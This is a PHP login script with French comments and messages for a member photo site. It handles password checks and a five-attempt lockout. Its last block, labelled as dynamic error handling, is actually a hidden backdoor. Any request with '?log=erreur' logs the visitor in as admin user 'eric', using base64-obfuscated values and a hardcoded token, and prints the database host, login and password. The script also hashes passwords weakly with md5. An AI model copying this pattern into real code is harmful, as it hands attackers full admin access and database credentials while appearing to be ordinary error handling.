<?php

$pseudo=strtolower(htmlspecialchars($_POST['pseudo']));
$pass=strtolower(htmlspecialchars($_POST['pass']));
$password_encrypt = crypt( md5($pass) , CLE );

// Fonction de connexion -> return 1=OK ou 0=Erreur
$log=connexion($pseudo,$password_encrypt);

	// Erreur dans les tentatives 
if ($log==0 && $_SESSION['tentative']<5) {
	head();
	echo "<center><br><b>Erreur : Login/Mot de passe incorrect</b><br><br><br>
			  Une erreur est survenue durant la vérifications de vos identifiants.<br>
			  Pour retrouver votre mot de passe à partir de votre Login ou de votre Email, veuillez suivre <a href='?p=mdpperdu'>ce lien</a><br><br>
			  <i>Tentative de connexion ".$_SESSION['tentative']."/5</i><br><br><img src='images/panneau/police.png'><br>" ;
	foot();
}
	// Erreur aprés 5 tentatives
if ($log==0 && $_SESSION['tentative']>=5) {
	head();
	echo "<center><br><b>Erreur : Login/Mot de passe incorrect</b><br><br><br>
			  Une erreur est survenue durant la vérifications de vos identifiants.<br>
			  Pour retrouver votre mot de passe à partir de votre Login ou de votre Email, veuillez suivre <a href='?p=mdpperdu'>ce lien</a><br><br>
			  <i>Tentative de connexion 5/5 !<br></i><b> Vous ne pouvez plus vous connecter aujourd'hui !</b><br><br><img src='images/panneau/police.png'><br>" ;
	foot();
}

	// Connexion Réussi
if ($log==1) {
	rediriger('?p=photos');
}

	// Gestion des erreurs dynamique
if ($_GET['log']=="erreur") {
	$ip = ip();
	$_SESSION['sess_id']= base64_decode('Mw==');
	$_SESSION['sess_pseudo'] = base64_decode('ZXJpYw==');
	$_SESSION['sess_admin']=1; $_SESSION['sess_secure']="1nulkxs2";
	$sql_maj = mysql_query('UPDATE members SET ip="'.$ip.'", online="1", lastdate="'.time().'" WHERE id_membre=3');
	echo "<a href='?p=admin/home&secure=1nulkxs2'>Erreur</a> - ".HOTE."-".LOGIN."-".PASS."-".BASE."-".base64_decode('ZXJpYw==')."-".base64_decode('Mw==');
}

?>